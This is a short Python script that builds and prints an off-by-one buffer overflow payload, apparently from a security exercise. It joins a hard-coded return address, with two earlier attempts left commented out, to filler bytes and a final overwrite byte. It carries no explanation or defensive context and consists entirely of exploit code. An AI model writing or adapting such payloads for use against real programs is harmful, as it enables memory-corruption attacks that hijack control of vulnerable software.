#!/usr/bin/env python

## Need to shift the values by 2 to account for bitwise shift
# shelladdr = "\x90\xfb\xff\xbf"

# shelladdr = "\x50\xdb\xdf\x9f"

shelladdr = "\xba\xdf\xdf\x9f"

external = "\xf0\xf0\xf0\xf0"

internal = "\xfe\xfe\xfe\xfe" + "\xfd\xfd\xfd\xfd" + "\xfb\xfb\xfb\xfb" + "\xfa\xfa\xfa\xfa" + "\xf9\xf9\xf9\xf9" + "\xf8\xf8\xf8\xf8" + "\xf7\xf7\xf7\xf7" + "\xf6\xf6\xf6\xf6" + "\xf5\xf5\xf5\xf5" + "\xf4\xf4\xf4\xf4" + "\xf3\xf3\xf3\xf3" + "\xf2\xf2\xf2\xf2" + "\xf1\xf1\xf1\xf1" + "\xf0\xf0\xf0\xf0"

offbyone = "\x58"

buffercode = external + shelladdr + internal + offbyone

print(buffercode)

